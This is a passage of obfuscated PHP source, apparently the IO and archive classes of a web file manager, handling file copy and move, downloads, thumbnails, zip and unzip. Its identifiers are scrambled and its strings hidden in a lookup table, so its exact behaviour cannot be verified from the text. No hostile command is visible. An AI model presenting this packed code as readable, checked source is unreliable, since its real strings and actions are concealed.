(!$•™¡È˜) { IO::errorTips($ÄØÌ³Ùİ[1143] . $™ìİäÉ . $ÄØÌ³Ùİ[70] . $ïÆ‹¼¡); } } self::copyMoveKeepInfo($ÎÓ¾ğÆÎ, $™ìİäÉ, $ı©èşÓ€); return $ı©èşÓ€; } private static function copyFile($ÎÏ›Š“ø, $³Û£ö¥, $ÃÆÁ§ô½, $¹¤«¡­, $µ÷›ëé¢, $¦Ñ™Äó®) { $Ÿé‰Ö©ö =& $_SERVER[ê‘³Æ±]; $¹¤«¡­ = $ÃÆÁ§ô½->getPath(rtrim($¹¤«¡­, $Ÿé‰Ö©ö[8]) . $Ÿé‰Ö©ö[8] . $µ÷›ëé¢); $²ÓĞ¶‡ = $Ÿé‰Ö©ö[1144] . time() . rand_string(5); Hook::trigger($Ÿé‰Ö©ö[1145], $ÎÏ›Š“ø, $³Û£ö¥, $ÃÆÁ§ô½, $¹¤«¡­, $µ÷›ëé¢, $²ÓĞ¶‡); if (self::driverIsSame($ÎÏ›Š“ø, $ÃÆÁ§ô½)) { if ($¦Ñ™Äó®) { $ËÄ‹Õµ = $ÃÆÁ§ô½->moveFile($³Û£ö¥, $¹¤«¡­); } else { $ËÄ‹Õµ = $ÃÆÁ§ô½->copyFile($³Û£ö¥, $¹¤«¡­); } Hook::trigger($Ÿé‰Ö©ö[1146], $ÎÏ›Š“ø, $³Û£ö¥, $ÃÆÁ§ô½, $¹¤«¡­, $µ÷›ëé¢, $ËÄ‹Õµ); self::copyMoveKeepInfo($ÎÏ›Š“ø, $³Û£ö¥, $ËÄ‹Õµ); return $ËÄ‹Õµ; } $ªêÙìı© = TEMP_FILES; if ($GLOBALS[$Ÿé‰Ö©ö[6]][$Ÿé‰Ö©ö[90]][$Ÿé‰Ö©ö[782]]) { $ªêÙìı© = $GLOBALS[$Ÿé‰Ö©ö[6]][$Ÿé‰Ö©ö[90]][$Ÿé‰Ö©ö[782]]; } $—¡¸è¯ = $ªêÙìı©; mk_dir($—¡¸è¯); $´…ôî…± = $—¡¸è¯ . $²ÓĞ¶‡; $ßº˜§õÍ = $´…ôî…±; $´…ôî…± = $ÎÏ›Š“ø->download($³Û£ö¥, $´…ôî…±); $´…ôî…± = $ÎÏ›Š“ø->iconvApp($´…ôî…±); if (substr($´…ôî…±, strlen($ªêÙìı©)) == $ªêÙìı©) { $¦Ñ™Äó® = !0; } $ËÄ‹Õµ = $ÃÆÁ§ô½->upload($¹¤«¡­, $´…ôî…±, $¦Ñ™Äó®); self::remove($ßº˜§õÍ); Hook::trigger($Ÿé‰Ö©ö[1146], $ÎÏ›Š“ø, $³Û£ö¥, $ÃÆÁ§ô½, $¹¤«¡­, $µ÷›ëé¢, $ËÄ‹Õµ); self::copyMoveKeepInfo($ÎÏ›Š“ø, $³Û£ö¥, $ËÄ‹Õµ); return $ËÄ‹Õµ; } private static function copyMoveKeepInfo($‘™‹ˆèÆ, $ç€Ò¯¢Ò, $‘”¯Ü©) { if (!$‘”¯Ü©) { return; } $º©¼Ã¨Í = $‘™‹ˆèÆ->info($ç€Ò¯¢Ò); if (!is_array($º©¼Ã¨Í)) { return; } IO::setModifyTime($‘”¯Ü©, $º©¼Ã¨Í[$_SERVER[ê‘³Æ±][86]]); } public static function pathFather($…Ãúõ‹€) { $İï÷Ğá¨ = IO::init($…Ãúõ‹€); $Ò¢Î³Ï = $İï÷Ğá¨->pathFather($İï÷Ğá¨->path); return $İï÷Ğá¨->getPathOuter($Ò¢Î³Ï); } public static function fileOut($ºšÀÈÙ², $“‡é›‰” = false, $‰ğ»‰º‡ = false, $â°ÍË“å = '') { $É·Õ× = self::driverMake($ºšÀÈÙ²); if ($É·Õ×->isFileOutServer()) { return $É·Õ×->fileOutServer($ºšÀÈÙ², $“‡é›‰”, $‰ğ»‰º‡, $â°ÍË“å); } return $É·Õ×->fileOut($ºšÀÈÙ², $“‡é›‰”, $‰ğ»‰º‡, $â°ÍË“å); } public static function fileOutImage($ßñÖĞĞ¼, $¶ÉÒøª = 250) { $¤ÜŸ®²Ş = array(250, 600, 1200, 2000, 3000, 5000); for ($·ÏÑ¥£¬ = 0; $·ÏÑ¥£¬ < count($¤ÜŸ®²Ş); $·ÏÑ¥£¬++) { if ($·ÏÑ¥£¬ == 0 && $¶ÉÒøª <= $¤ÜŸ®²Ş[$·ÏÑ¥£¬]) { $¶ÉÒøª = $¤ÜŸ®²Ş[$·ÏÑ¥£¬]; break; } else { if ($¶ÉÒøª > $¤ÜŸ®²Ş[$·ÏÑ¥£¬ - 1] && $¶ÉÒøª <= $¤ÜŸ®²Ş[$·ÏÑ¥£¬]) { $¶ÉÒøª = $¤ÜŸ®²Ş[$·ÏÑ¥£¬]; break; } else { if ($·ÏÑ¥£¬ == count($¤ÜŸ®²Ş) - 1 && $¶ÉÒøª > $¤ÜŸ®²Ş[$·ÏÑ¥£¬]) { $¶ÉÒøª = $¤ÜŸ®²Ş[$·ÏÑ¥£¬]; break; } } } } $«ôÂŞƒò = self::driverMake($ßñÖĞĞ¼); if ($«ôÂŞƒò->isFileOutServer()) { return $«ôÂŞƒò->fileOutImageServer($ßñÖĞĞ¼, $¶ÉÒøª); } return $«ôÂŞƒò->fileOutImage($ßñÖĞĞ¼, $¶ÉÒøª); } private static function driverIsSame($Ë¬­Ù­´, $ğàö÷™ã) { $óÓÎ™ =& $_SERVER[ê‘³Æ±]; $´ŸÇÌıé = $Ë¬­Ù­´->getType(); $²€¸ìï = $ğàö÷™ã->getType(); if ($´ŸÇÌıé != $²€¸ìï) { return !1; } if ($´ŸÇÌıé == $óÓÎ™[744]) { return !0; } if ($´ŸÇÌıé == $óÓÎ™[107]) { return !0; } if ($Ë¬­Ù­´->pathDriver == $ğàö÷™ã->pathDriver) { return !0; } return !1; } public static function copyUpdate($†İç»², $‰ª°Ççô) { $òØŠÄà =& $_SERVER[ê‘³Æ±]; if (!IO::exist($†İç»²)) { return !1; } if (!IO::exist($‰ª°Ççô)) { IO::mkdir($‰ª°Ççô); } $ †éÌêÁ = self::_listAll($†İç»²); $å ª¥ª¨ = self::_listAll($‰ª°Ççô); $ˆÔ€© = array(); $İ×‹³õç = array(); foreach ($ †éÌêÁ as $ºù£££¼ => $Ø÷¨İË) { if (isset($å ª¥ª¨[$ºù£££¼])) { if ($Ø÷¨İË[$òØŠÄà[79]] == 1) { continue; } if ($å ª¥ª¨[$ºù£££¼][$òØŠÄà[80]] == $Ø÷¨İË[$òØŠÄà[80]]) { continue; } } if ($Ø÷¨İË[$òØŠÄà[79]] == 1) { $İ×‹³õç[] = $‰ª°Ççô . $òØŠÄà[8] . $ºù£££¼; continue; } $È¾–°º„ = strstr(trim($ºù£££¼, $òØŠÄà[8]), $òØŠÄà[8]) ? get_path_father($ºù£££¼) : $òØŠÄà[12]; $ˆÔ€©[] = array($òØŠÄà[1147] => $Ø÷¨İË[$òØŠÄà[78]], $òØŠÄà[1148] => rtrim($‰ª°Ççô, $òØŠÄà[8]) . $òØŠÄà[8] . $È¾–°º„, $òØŠÄà[1149] => $Ø÷¨İË); } $íşÎšİÛ = array($òØŠÄà[194] => $ˆÔ€©, $òØŠÄà[79] => $İ×‹³õç); Hook::trigger($òØŠÄà[1150], $†İç»², $‰ª°Ççô, $íşÎšİÛ); foreach ($İ×‹³õç as $Ø÷¨İË) { IO::mkdir($Ø÷¨İË); } foreach ($ˆÔ€© as $Ø÷¨İË) { IO::copy($Ø÷¨İË[$òØŠÄà[1147]], $Ø÷¨İË[$òØŠÄà[1148]], REPEAT_REPLACE); } } private static function _listAll($ÀıÓŠó) { $°šñ”ô¤ =& $_SERVER[ê‘³Æ±]; $ÀıÓŠó = KodIO::clear($ÀıÓŠó); $Å³ÅÄ¤Œ = IO::listAll($ÀıÓŠó); foreach ($Å³ÅÄ¤Œ as &$–¯»»¾„) { $ÌœüÃ¬ = substr($–¯»»¾„[$°šñ”ô¤[78]], strlen($ÀıÓŠó)); $–¯»»¾„[$°šñ”ô¤[1151]] = trim($ÌœüÃ¬, $°šñ”ô¤[8]); } unset($–¯»»¾„); return array_to_keyvalue($Å³ÅÄ¤Œ, $°šñ”ô¤[1151]); } public static function fileSubstr($öƒØıÆå, $Ğæ»«àû, $‡µš…˜¡ = false) { $ÊàØøÖ =& $_SERVER[ê‘³Æ±]; $­´¯û† = self::driverMake($öƒØıÆå); $‹Õ’ƒ‚È = $­´¯û†->size($öƒØıÆå); $ùÌêê¨ë = $Ğæ»«àû; $¥¸­¢ÈŒ = $‡µš…˜¡; if ($Ğæ»«àû < 0) { $Ğæ»«àû = $‹Õ’ƒ‚È + $Ğæ»«àû; } if ($‡µš…˜¡ === !1) { $‡µš…˜¡ = $‹Õ’ƒ‚È - $Ğæ»«àû; } if ($Ğæ»«àû + $‡µš…˜¡ > $‹Õ’ƒ‚È) { $‡µš…˜¡ = $‹Õ’ƒ‚È - $Ğæ»«àû; } if (!$‹Õ’ƒ‚È && $­´¯û†->getType() == $ÊàØøÖ[107] && !$­´¯û†->exist($öƒØıÆå)) { $¤°Å•ÊÔ = get_path_this($öƒØıÆå); $ˆŠÁ›ÁÆ = parse_url_query($¤°Å•ÊÔ); if (is_array($ˆŠÁ›ÁÆ) && isset($ˆŠÁ›ÁÆ[$ÊàØøÖ[32]])) { $¤°Å•ÊÔ = urldecode($ˆŠÁ›ÁÆ[$ÊàØøÖ[32]]); } throw new Exception($ÊàØøÖ[1152] . LNG($ÊàØøÖ[1153]) . $ÊàØøÖ[955] . clear_html($¤°Å•ÊÔ) . $ÊàØøÖ[12]); } if ($‡µš…˜¡ <= 0) { return $ÊàØøÖ[12]; } if ($Ğæ»«àû < 0 || $Ğæ»«àû >= $‹Õ’ƒ‚È || $‡µš…˜¡ > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\145\122\145\141\x64\x20\x65\x72\162\x6f\x72\x21\x20\163\x74\x61\x72\164\75{$Ğæ»«àû}\x3b\x6c\145\156\147\164\150\75{$‡µš…˜¡}\x3b\40\163\151\172\x65\x3d{$‹Õ’ƒ‚È}\73"); } $‹ºĞû¾„ = $­´¯û†->fileSubstr($öƒØıÆå, $Ğæ»«àû, $‡µš…˜¡); if (!$‹ºĞû¾„ && $‡µš…˜¡ && isset($GLOBALS[$ÊàØøÖ[1154]])) { throw new Exception($GLOBALS[$ÊàØøÖ[1154]][$ÊàØøÖ[1155]]); } return $‹ºĞû¾„; } private static function driverMake(&$‹†‹†ø) { $Š¦£” =& $_SERVER[ê‘³Æ±]; $ÉöàşÀß = KodIO::parse($‹†‹†ø); if (!self::$driverListSystem) { $”Ê±µüØ = Model($Š¦£”[753])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($”Ê±µüØ, $Š¦£”[394]); } if ($ÉöàşÀß[$Š¦£”[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ÉöàşÀß[$Š¦£”[394]]]) { return !1; } $‹†‹†ø = $ÉöàşÀß[$Š¦£”[1156]]; $µÇğ“Àò = self::driverGet($ÉöàşÀß, $‹†‹†ø); return $µÇğ“Àò; } private static function driverGet($Òş¾íÉ”, &$í´õ˜õª) { $’ÊçÏËã =& $_SERVER[ê‘³Æ±]; $™öÛ¸ú€ = $Òş¾íÉ”[$’ÊçÏËã[1157]]; $â±à²¤î = $Òş¾íÉ”[$’ÊçÏËã[394]]; switch ($Òş¾íÉ”[$’ÊçÏËã[33]]) { case KodIO::KOD_IO: $Ãı“ö = self::$driverListSystem[$â±à²¤î]; break; case KodIO::KOD_SOURCE: $í´õ˜õª = $â±à²¤î . $í´õ˜õª; $Ãı“ö = array($’ÊçÏËã[1158] => $’ÊçÏËã[1159], $’ÊçÏËã[6] => $Òş¾íÉ”); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $çšŠ¾‡Ö = $GLOBALS[$’ÊçÏËã[1160]]; self::$driverListUser = array_to_keyvalue($çšŠ¾‡Ö, $’ÊçÏËã[394]); } $Ãı“ö = self::$driverListUser[$â±à²¤î]; break; case KodIO::KOD_SHARE_LINK: $Ãı“ö = array($’ÊçÏËã[1158] => $’ÊçÏËã[1161], $’ÊçÏËã[6] => $Òş¾íÉ”); $ã§È»¯£ = Action($’ÊçÏËã[1162])->sharePathInfo($Òş¾íÉ”[$’ÊçÏËã[78]]); $í´õ˜õª = $ã§È»¯£[$’ÊçÏËã[396]]; if (!$ã§È»¯£[$’ÊçÏËã[396]]) { $ß²¢ÉÛë = Model($’ÊçÏËã[591])->getInfo($ã§È»¯£[$’ÊçÏËã[481]]); $í´õ˜õª = KodIO::clear($ß²¢ÉÛë[$’ÊçÏËã[1163]] . $Òş¾íÉ”[$’ÊçÏËã[1156]]); $Òş¾íÉ”[$’ÊçÏËã[479]] = $ß²¢ÉÛë; $Òş¾íÉ”[$’ÊçÏËã[1140]] = $í´õ˜õª; $Ãı“ö = array($’ÊçÏËã[1158] => $’ÊçÏËã[1164], $’ÊçÏËã[6] => $Òş¾íÉ”); } break; case KodIO::KOD_SHARE_ITEM: $Ãı“ö = array($’ÊçÏËã[1158] => $’ÊçÏËã[1165], $’ÊçÏËã[6] => $Òş¾íÉ”); $ß²¢ÉÛë = Model($’ÊçÏËã[591])->getInfo($Òş¾íÉ”[$’ÊçÏËã[394]]); if ($ß²¢ÉÛë[$’ÊçÏËã[396]] == $’ÊçÏËã[192]) { $í´õ˜õª = KodIO::clear($ß²¢ÉÛë[$’ÊçÏËã[1163]] . $Òş¾íÉ”[$’ÊçÏËã[1156]]); $Òş¾íÉ”[$’ÊçÏËã[479]] = $ß²¢ÉÛë; $Òş¾íÉ”[$’ÊçÏËã[1140]] = $í´õ˜õª; $Ãı“ö = array($’ÊçÏËã[1158] => $’ÊçÏËã[1166], $’ÊçÏËã[6] => $Òş¾íÉ”); } else { if (!$í´õ˜õª) { $í´õ˜õª = $ß²¢ÉÛë[$’ÊçÏËã[396]]; } } break; default: $í´õ˜õª = $Òş¾íÉ”[$’ÊçÏËã[78]]; $Ãı“ö = array($’ÊçÏËã[1158] => $’ÊçÏËã[1167]); break; } $Îó’şü = $Òş¾íÉ”[$’ÊçÏËã[78]]; if (!isset(self::$driverCache[$Îó’şü])) { $èŸœíò¬ = strtolower($Ãı“ö[$’ÊçÏËã[96]]); $Â²—¡Œ = $GLOBALS[$’ÊçÏËã[6]][$’ÊçÏËã[90]][$’ÊçÏËã[820]]; $“÷†Ÿ—‘ = $’ÊçÏËã[74] . (isset($Â²—¡Œ[$èŸœíò¬]) ? $Â²—¡Œ[$èŸœíò¬] : ucfirst($èŸœíò¬)); if (!class_exists($“÷†Ÿ—‘)) { show_json("{$“÷†Ÿ—‘}\x20\156\157\164\40\145\170\x69\163\164\163\x21", !1); } $ÛßÒ¤şÏ = isset($Ãı“ö[$’ÊçÏËã[6]]) ? $Ãı“ö[$’ÊçÏËã[6]] : !1; self::$driverCache[$Îó’şü] = new $“÷†Ÿ—‘($ÛßÒ¤şÏ); } $ÔÀú‰€¯ = self::$driverCache[$Îó’şü]; $ÔÀú‰€¯->pathDriver = $™öÛ¸ú€; $ÔÀú‰€¯->pathBase = $’ÊçÏËã[12]; if (isset($Ãı“ö[$’ÊçÏËã[6]][$’ÊçÏËã[1168]])) { $ÔÀú‰€¯->pathBase = rtrim($Ãı“ö[$’ÊçÏËã[6]][$’ÊçÏËã[1168]], $’ÊçÏËã[8]) . $’ÊçÏËã[8]; $í´õ˜õª = $ÔÀú‰€¯->pathBase . ltrim($í´õ˜õª, $’ÊçÏËã[8]); } $í´õ˜õª = $ÔÀú‰€¯->getPath($í´õ˜õª); if (isset($Òş¾íÉ”[$’ÊçÏËã[1140]])) { $í´õ˜õª = $Òş¾íÉ”[$’ÊçÏËã[1140]]; } $ÔÀú‰€¯->path = $í´õ˜õª; return $ÔÀú‰€¯; } public static function errorTips($èæ¡û¡˜ = false) { $–ç‚‚ãµ =& $_SERVER[ê‘³Æ±]; static $Ò”Ó¿— = array(); $ª“ ìÄ× = 1000; if ($èæ¡û¡˜ === -1) { return $Ò”Ó¿— ? $Ò”Ó¿—[count($Ò”Ó¿—) - 1] : $–ç‚‚ãµ[12]; } if ($èæ¡û¡˜ === !1) { return implode($–ç‚‚ãµ[228], $Ò”Ó¿—); } if (count($Ò”Ó¿—) >= $ª“ ìÄ×) { $Ò”Ó¿— = array_slice($Ò”Ó¿—, $ª“ ìÄ× * 0.5, $ª“ ìÄ×); } $Ò”Ó¿—[] = $èæ¡û¡˜; write_log($–ç‚‚ãµ[161] . ACTION . $–ç‚‚ãµ[1169] . $èæ¡û¡˜, $–ç‚‚ãµ[1170]); } public static function getLastError($İ±áÃè = '') { $ªÊÊõ½— = self::errorTips(-1); return $ªÊÊõ½— ? $ªÊÊõ½— : $İ±áÃè; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ğ¬šƒâ·; if (!$ğ¬šƒâ·) { $¯º˜ãäˆ = IO::init($_SERVER[ê‘³Æ±][8]); } return $¯º˜ãäˆ; } private static function iconvSystem($¬ÊÌË¸) { return self::local()->iconvSystem($¬ÊÌË¸); } private static function iconvApp($âÆÉÁªº) { return self::local()->iconvApp($âÆÉÁªº); } public static function zip($ëÑå¤, $ŒŞ‚ÒÀú = "\x7a\x69\160", $ˆ±Ÿ¼Ã— = '', $æ—ÁßÅæ = REPEAT_RENAME) { $—Á¸¿âº =& $_SERVER[ê‘³Æ±]; $¤âÊÏ»œ = self::init($ëÑå¤[0][$—Á¸¿âº[78]]); $ÈÔæï = self::info($ëÑå¤[0][$—Á¸¿âº[78]]); $”ÜõÜ±ù = !1; if (!$ˆ±Ÿ¼Ã— && $¤âÊÏ»œ->getType() == $—Á¸¿âº[107]) { $ÇûÛüŞ‡ = self::zipFileList($ëÑå¤); } else { $”ÜõÜ±ù = $ˆ±Ÿ¼Ã— ? $ˆ±Ÿ¼Ã— : TEMP_FILES . $—Á¸¿âº[1171] . time() . rand_string(8) . $—Á¸¿âº[8]; mk_dir($”ÜõÜ±ù); $ÇûÛüŞ‡ = self::zipFileList($ëÑå¤, $”ÜõÜ±ù); } $¥³ìô = $ÈÔæï[$—Á¸¿âº[32]]; if (count($ÇûÛüŞ‡) > 1) { $ ‚õÜàë = IO::info(IO::pathFather($ÈÔæï[$—Á¸¿âº[78]])); $¥³ìô = $ ‚õÜàë[$—Á¸¿âº[32]]; } $Ø…Í±¼© = $”ÜõÜ±ù; if (!$Ø…Í±¼©) { $Ø…Í±¼© = get_path_father($ÈÔæï[$—Á¸¿âº[78]]); if (!$ˆ±Ÿ¼Ã— && $¤âÊÏ»œ->getType() == $—Á¸¿âº[107]) { $Ø…Í±¼© = get_path_father($¤âÊÏ»œ->path); } $ĞÊ­Ô§Ú = IO::info($Ø…Í±¼©); if (!$ĞÊ­Ô§Ú[$—Á¸¿âº[197]]) { show_json(LNG($—Á¸¿âº[1172]), !1); } } $´“Ûàô” = $Ø…Í±¼© . $¥³ìô . $—Á¸¿âº[10] . $ŒŞ‚ÒÀú; $´“Ûàô” = get_filename_auto($´“Ûàô”, $—Á¸¿âº[12], $æ—ÁßÅæ); $ÏìÓœŸ¿ = self::iconvSystem($´“Ûàô”); foreach ($ÇûÛüŞ‡ as $í·ÆÎ—· => $ø±«ß¡†) { $ÇûÛüŞ‡[$í·ÆÎ—·] = self::iconvSystem($ø±«ß¡†); } KodArchive::create($ÏìÓœŸ¿, $ÇûÛüŞ‡); if (!IO::exist($´“Ûàô”)) { if ($”ÜõÜ±ù) { del_dir($”ÜõÜ±ù); } show_json(LNG($—Á¸¿âº[1173]), !1); } if ($ˆ±Ÿ¼Ã— || !$”ÜõÜ±ù) { if ($”ÜõÜ±ù && strstr($”ÜõÜ±ù, TEMP_FILES)) { $ÇºÊ§œ = $ÇûÛüŞ‡ = array(); recursion_dir($Ø…Í±¼©, $ÇºÊ§œ, $ÇûÛüŞ‡, 0); foreach ($ÇºÊ§œ as $´ŒúŒ³Ï) { del_dir($´ŒúŒ³Ï); } foreach ($ÇûÛüŞ‡ as $óÜµ½Å†) { if ($óÜµ½Å† == $ÏìÓœŸ¿) { continue; } del_file($óÜµ½Å†); } } return $´“Ûàô”; } $«Ë‚€šñ = self::pathFather($ÈÔæï[$—Á¸¿âº[78]]); $™Œú ÑÌ = self::move($´“Ûàô”, $«Ë‚€šñ, $æ—ÁßÅæ); if (!$™Œú ÑÌ) { del_dir($”ÜõÜ±ù); show_json(LNG($—Á¸¿âº[1173]), !1); } del_dir($”ÜõÜ±ù); return $™Œú ÑÌ; } public static function unzip($éç…·èİ, $¥ğŞ½“ = "\162\x65\160\154\141\x63\145") { $ÛÙ¢”‘ =& $_SERVER[ê‘³Æ±]; $‚ù¼ıÆõ = $éç…·èİ[$ÛÙ¢”‘[78]]; $¢³Åó« = $éç…·èİ[$ÛÙ¢”‘[1174]]; if (!($À¾—³Í¨ = parent::info($‚ù¼ıÆõ))) { show_json(LNG($ÛÙ¢”‘[1175]), !1); } if (!($ˆÓÃœ¦Ü = parent::infoFull($¢³Åó«))) { $¢³Åó« = parent::mkdir($¢³Åó«); $ˆÓÃœ¦Ü = array($ÛÙ¢”‘[78] => $¢³Åó«); } else { if (isset($ˆÓÃœ¦Ü[$ÛÙ¢”‘[396]]) && trim($ˆÓÃœ¦Ü[$ÛÙ¢”‘[78]], $ÛÙ¢”‘[8]) != trim($¢³Åó«, $ÛÙ¢”‘[8])) { $ÁôÊú—® = KodIO::make($ˆÓÃœ¦Ü[$ÛÙ¢”‘[491]]); $ÍÉ‘ëÃ³ = parent::fileNameAuto($ÁôÊú—®, $ˆÓÃœ¦Ü[$ÛÙ¢”‘[32]], REPEAT_RENAME_FOLDER, !0); $¢³Åó« = parent::mkdir($ÁôÊú—® . $ÍÉ‘ëÃ³); $ˆÓÃœ¦Ü = array($ÛÙ¢”‘[78] => $¢³Åó«); } } $¢³Åó« = $ˆÓÃœ¦Ü[$ÛÙ¢”‘[78]]; $éŸ•ª¤ = self::tmpFileName($À¾—³Í¨); $ıïÈ¸Ù„ = TEMP_FILES . $éŸ•ª¤; del_dir($ıïÈ¸Ù„); mk_dir($ıïÈ¸Ù„); $ô‡èøüÁ = self::fileExt($À¾—³Í¨); $Àö»Ü– = $ıïÈ¸Ù„ . $ÛÙ¢”‘[10] . $ô‡èøüÁ; if (!@file_exists(self::iconvSystem($Àö»Ü–))) { $Æ‡‘££Â = self::localFilePath($‚ù¼ıÆõ, $ô‡èøüÁ); $Àö»Ü– = $Æ‡‘££Â ? $Æ‡‘££Â : parent::download($‚ù¼ıÆõ, $Àö»Ü–); } $Àö»Ü– = self::iconvSystem($Àö»Ü–); $Ü»æ—Î‰ = isset($éç…·èİ[$ÛÙ¢”‘[1176]]) ? $éç…·èİ[$ÛÙ¢”‘[1176]] : $ÛÙ¢”‘[1177]; $ïùÃ¼ = KodArchive::extract($Àö»Ü–, $ıïÈ¸Ù„ . $ÛÙ¢”‘[8], $Ü»æ—Î‰); self::archiveExt(); if (!$ïùÃ¼[$ÛÙ¢”‘[1178]]) { show_json($ÛÙ¢”‘[1179] . $ïùÃ¼[$ÛÙ¢”‘[1180]], !1); } Hook::trigger($ÛÙ¢”‘[1181], $ıïÈ¸Ù„); recursion_dir($ıïÈ¸Ù„, $Ïöã’İı, $ø‡Ù¼Çö, 0); $Ä÷š¡•  = array_merge($Ïöã’İı, $ø‡Ù¼Çö); foreach ($Ä÷š¡•  as $·¤œÛ­ì) { $·¤œÛ­ì = self::iconvApp($·¤œÛ­ì); self::move($·¤œÛ­ì, $¢³Åó«, $¥ğŞ½“); } del_dir($ıïÈ¸Ù„); if (!$Æ‡‘££Â) { del_file($Àö»Ü–); } return !0; } public static function unzipList($‹Îç¨¯”) { $Ø¡«ß© =& $_SERVER[ê‘³Æ±]; $ÚóæÆ¨ñ = $‹Îç¨¯”[$Ø¡«ß©[78]]; $Ìí¼’ê… = isset($‹Îç¨¯”[$Ø¡«ß©[1182]]) ? $‹Îç¨¯”[$Ø¡«ß©[1182]] : -1; $µ¬óòÆ® = 50000; if (request_url_safe($ÚóæÆ¨ñ)) { $˜ä˜Ç• = parse_url_query($ÚóæÆ¨ñ); if (!isset($˜ä˜Ç•[$Ø¡«ß©[78]])) { show_json($Ø¡«ß©[1183], !1); } } $œ˜Ú‰—í = isset($˜ä˜Ç•) ? $˜ä˜Ç•[$Ø¡«ß©[78]] : $ÚóæÆ¨ñ; $½ôĞÒÙÛ = self::info($œ˜Ú‰—í); $¹¤ï† = self::fileExt($½ôĞÒÙÛ); $ø­·øËÃ = self::tmpFileName($½ôĞÒÙÛ); if (isset($˜ä˜Ç•)) { $Üû•±Š§ = array($˜ä˜Ç•[$Ø¡«ß©[78]], $˜ä˜Ç•[$Ø¡«ß©[1182]], $˜ä˜Ç•[$Ø¡«ß©[32]]); $èµ” = md5(implode($Ø¡«ß©[11], $Üû•±Š§)) . $Ø¡«ß©[10] . get_path_ext($˜ä˜Ç•[$Ø¡«ß©[32]]); } else { $Üû•±Š§ = array($½ôĞÒÙÛ[$Ø¡«ß©[32]], $½ôĞÒÙÛ[$Ø¡«ß©[78]], $½ôĞÒÙÛ[$Ø¡«ß©[80]]); $èµ” = md5(implode($Ø¡«ß©[11], $Üû•±Š§)) . $Ø¡«ß©[10] . $¹¤ï†; } if ($Ìí¼’ê… == -1) { $®ë±ìÓ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\151\145\167\57{$ø­·øËÃ}\57{$èµ”}\x2e\154\x6f\x67"; $Û’Êï¡ü = self::infoFull($®ë±ìÓ); if ($Û’Êï¡ü) { $®ë±ìÓ = $Û’Êï¡ü[$Ø¡«ß©[78]]; $ Í²¢® = self::getContent($®ë±ìÓ); if ($ Í²¢®) { $†¢ç„Ã‡ = json_decode($ Í²¢®, !0); $†¢ç„Ã‡ = is_array($†¢ç„Ã‡) ? $†¢ç„Ã‡ : array(); if (count($†¢ç„Ã‡) >= $µ¬óòÆ®) { show_json(sprintf(LNG($Ø¡«ß©[1184]), count($†¢ç„Ã‡)), !1); } return $†¢ç„Ã‡; } } else { $®ë±ìÓ = self::mkfile($®ë±ìÓ); } } $ÃáÉ ŠÅ = TEMP_FILES . $ø­·øËÃ; if (!is_dir($ÃáÉ ŠÅ)) { mk_dir($ÃáÉ ŠÅ); } $¯üÙ·‘ = $ÃáÉ ŠÅ . $Ø¡«ß©[8] . $èµ”; if (!@file_exists(self::iconvSystem($¯üÙ·‘))) { if (isset($˜ä˜Ç•)) { url_request($ÚóæÆ¨ñ, $Ø¡«ß©[1185], $¯üÙ·‘); } else { $³Û¬‹ó = self::localFilePath($ÚóæÆ¨ñ, $¹¤ï†); $¯üÙ·‘ = $³Û¬‹ó ? $³Û¬‹ó : self::download($ÚóæÆ¨ñ, $¯üÙ·‘); } } $¯üÙ·‘ = self::iconvSystem($¯üÙ·‘); if ($Ìí¼’ê… >= 0) { $‘©Ãìğœ = isset($‹Îç¨¯”[$Ø¡«ß©[1186]]) ? $‹Îç¨¯”[$Ø¡«ß©[1186]] : !1; $‚˜ÎÖ× = isset($‹Îç¨¯”[$Ø¡«ß©[32]]) ? $‹Îç¨¯”[$Ø¡«ß©[32]] : $Ø¡«ß©[12]; KodArchive::filePreview($¯üÙ·‘, $Ìí¼’ê…, $‘©Ãìğœ, $‚˜ÎÖ×); self::archiveExt(); die; } $ÃšåÀ‘ = KodArchive::listContent($¯üÙ·‘); self::archiveExt(); del_dir($ÃáÉ ŠÅ); if (!$ÃšåÀ‘[$Ø¡«ß©[1178]]) { show_json($ÃšåÀ‘[$Ø¡«ß©[1180]], !1); } $†¢ç„Ã‡ = json_encode($ÃšåÀ‘[$Ø¡«ß©[1180]]); self::setContent($®ë±ìÓ, $†¢ç„Ã‡); if (count($ÃšåÀ‘[$Ø¡«ß©[1180]]) >= $µ¬óòÆ®) { show_json(sprintf(LNG($Ø¡«ß©[1184]), count($ÃšåÀ‘[$Ø¡«ß©[1180]])), !1); } return $ÃšåÀ‘[$Ø¡«ß©[1180]]; } private static function fileExt($Ó€ŒŠ¡­) { $ò‘ñ‹© =& $_SERVER[ê‘³Æ±]; $‹Æ®×”ö = $Ó€ŒŠ¡­[$ò‘ñ‹©[169]]; if ($‹Æ®×”ö == $ò‘ñ‹©[1187]) { $µö‘äÑ¨ = $ò‘ñ‹©[1188]; if (substr($Ó€ŒŠ¡­[$ò‘ñ‹©[32]], -strlen($µö‘äÑ¨)) == $µö‘äÑ¨) { $‹Æ®×”ö = $ò‘ñ‹©[1189]; } } self::archiveExt($‹Æ®×”ö); return $‹Æ®×”ö; } private static function zipFileList($²çÎ×•÷, $Ü¡­ôó = false) { $µ¯ÏåØ¨ =& $_SERVER[ê‘³Æ±]; $†‹³´óñ = array(); foreach ($²çÎ×•÷ as $àâŸ‹ÄÀ) { $Øô¶û£À = $àâŸ‹ÄÀ[$µ¯ÏåØ¨[78]]; if ($Ü¡­ôó) { $Øô¶û£À = self::copy($àâŸ‹ÄÀ[$µ¯ÏåØ¨[78]], $Ü¡­ôó, $µ¯ÏåØ¨[812]); } else { $ü´öš›± = self::init($àâŸ‹ÄÀ[$µ¯ÏåØ¨[78]]); if ($ü´öš›±->getType() == $µ¯ÏåØ¨[107]) { $Øô¶û£À = $ü´öš›±->path; } } if ($Øô¶û£À && self::local()->exist($Øô¶û£À)) { $†‹³´óñ[$àâŸ‹ÄÀ[$µ¯ÏåØ¨[78]]] = $Øô¶û£À; } } if (!empty($†‹³´óñ)) { return array_values($†‹³´óñ); } show_json(LNG($µ¯ÏåØ¨[1153]), !1); } public static function tmpFileName($´²Ô÷áì) { $ú½…°ë =& $_SERVER[ê‘³Æ±]; $óãŠ· = array($´²Ô÷áì[$ú½…°ë[32]], $´²Ô÷áì[$ú½…°ë[78]], 